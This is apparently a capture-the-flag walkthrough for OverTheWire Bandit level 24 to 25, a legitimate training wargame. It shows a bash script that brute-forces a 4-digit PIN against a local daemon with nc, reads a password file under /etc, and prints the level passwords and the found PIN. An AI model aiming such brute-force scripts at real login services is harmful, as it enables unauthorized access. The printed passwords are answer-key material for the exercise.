# BANDIT LEVEL 24 --> LEVEL 25

```
http://overthewire.org/wargames/bandit/bandit25.html
```

### Level Goal

A daemon is listening on port `30002` and will give you the password for bandit25 if given
the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve
the pincode except by going through all of the 10000 combinations, called brute-forcing.

### SOLUTION

First let's get the password we need..

```
bandit24@bandit:~$ cat /etc/bandit_pass/bandit24
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

And we validate there is something running against port `30002`..

```
bandit24@bandit:~$ nmap -p 30002 localhost

Starting Nmap 7.40 ( https://nmap.org ) at 2018-10-24 01:48 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00011s latency).
PORT      STATE SERVICE
30002/tcp open  pago-services2

Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds
```

So let's try this out..

```
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
Wrong! Please enter the correct pincode. Try again.
Timeout. Exiting.
```

.. and now we script!

```
bandit24@bandit:~$ echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001" | nc localhost 30002  -w1
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
```

```
bandit24@bandit:/tmp/foofoo$ cat loop.sh
#! /bin/bash

i=$1
# ensure $i is between 0 <=i <= 9
if [ "$i" -lt 0 ] || [ "$i" -gt 9 ]; then
  echo "USAGE: $0 <int>"
  exit 0
fi

for j in `seq 0 9`; do
  for k in `seq 0 9`; do
    for l in `seq 0 9`; do
      output=$(echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i$j$k$l" | nc localhost 30002 -w1)
      echo $output
      echo $output | grep Wrong >/dev/null
      if [ $? -eq 0 ]; then
        echo "$i$j$k$l: FAILED.."
      else
        echo "$i$j$k$l: SUCCESS!"
      fi
    done
  done
done
bandit24@bandit:/tmp/foofoo$ for n in `seq 0 9`; do
> ./loop.sh $n > output$n.log 2>&1 &
> done
bandit24@bandit:/tmp/foofoo$ tail -f output0.log
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Wrong! Please enter the correct pincode. Try again.
0000: FAILED..
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Wrong! Please enter the correct pincode. Try again.
0001: FAILED..

<...>

I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Wrong! Please enter the correct pincode. Try again.
0377: FAILED..
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Correct! The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG Exiting.
0378: SUCCESS!
```

Eventually we find the pin is `0378`.

```
bandit24@bandit:~$ echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0378" | nc localhost 30002  -w1
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```
